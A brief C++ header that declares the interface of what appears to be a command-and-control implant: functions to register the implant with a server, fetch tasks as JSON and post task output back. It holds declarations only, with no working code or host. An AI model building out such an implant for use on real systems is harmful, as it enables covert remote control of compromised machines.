#pragma once
#include "../protocols/json/json.h"

nlohmann::json get(std::string implant_uuid);
int post(std::string implant_uuid, std::string output_data, std::string task_uuid);
/** 
* @brief Registers implant with Server. 
* @return  
*/
std::string register_implant();